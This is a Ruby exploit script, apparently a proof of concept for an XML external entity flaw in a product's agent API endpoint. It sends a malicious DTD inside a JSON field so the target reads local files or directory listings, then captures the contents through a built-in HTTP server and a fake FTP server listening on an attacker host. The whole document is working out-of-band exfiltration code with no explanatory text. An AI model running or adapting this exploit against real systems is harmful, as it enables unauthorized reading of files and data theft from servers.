require 'json'
require 'socket'
require 'httparty'
require 'timeout'

TARGET = ARGV[0] || '10.0.0.148'
CONNECTBACK_PORT = 9091
FTP_PORT = 9191
FTP_WAIT = 1 # Seconds

puts "TARGET: #{ TARGET }"
puts
# PAYLOAD = '<?xml version="1.0" encoding="UTF-8"?>
#   <!DOCTYPE data [
#     <!ENTITY % start "<![CDATA[">
#       <!ENTITY % file SYSTEM "file:/windows/win.ini">
#     <!ENTITY % end "]]>">
#     <!ENTITY % dtd SYSTEM "http://10.0.0.146:9091/data.dtd"> %dtd;]>
#   <data>&send;</data>'

# File.write("/tmp/test.json", [{
#   "DomainName" => "ad.example.local",
#   "EventCode" => 4688,
#   "EventType" => 0,
#   "TimeGenerated" => 0,
#   "Task Content" => PAYLOAD,
# }].to_json)

def recv_until(s, str)
  out = ''

  loop do
    data = s.recv(32)
    if !data || data == ''
      puts "Connection closed"
      exit
    end

    out += data
    if out.end_with?(str)
      return out
    end
  end
end

def list_files(folder = "\\users")
  $stderr.puts "Attempting to get directory listing for #{ folder }..."

  ftp_server = TCPServer.new(FTP_PORT)

  http_thread = Thread.new do
    http_server = TCPServer.new(CONNECTBACK_PORT)
    c = http_server.accept()

    recv_until(c, "\r\n\r\n")

    response = "<!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://10.0.0.146:#{ FTP_PORT }/%file;'>\"> %all;"
    c.print("HTTP/1.0 200 OK\r\nContent-Length: #{ response.length }\r\n\r\n#{ response }")
    c.close()
    http_server.close()
  end

  HTTParty.post(
    "http://#{ TARGET }:8081/api/agent/tabs/agentData",
    :body => [{
      "DomainName" => "ad.example.local",
      "EventCode" => 4688,
      "EventType" => 0,
      "TimeGenerated" => 0,
      "Task Content" => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
        <!DOCTYPE data [
        <!ENTITY % file SYSTEM \"file:#{ folder }\">
        <!ENTITY % dtd SYSTEM \"http://10.0.0.146:#{ CONNECTBACK_PORT }/data.dtd\"> %dtd;
        ]>

        <data>&send;</data>",
    }].to_json(),

    :headers => {
      "Content-Type" => "application/json",
    },
  )

  c = ftp_server.accept()

  c.puts "200 FTP Server"
  recv_until(c, "\n")
  c.puts "331 password please"
  recv_until(c, "\n")

  out = ''
  begin
    Timeout::timeout(FTP_WAIT) do
      loop do
        c.puts "230 more data please!"
        out = recv_until(c, "\n")
      end
    end
  rescue
  end
  c.close()
  ftp_server.close()

  return out.gsub(/.*RETR /, '').split(/\n/)
end

puts list_files(ARGV[1] || '\\').join("\n")
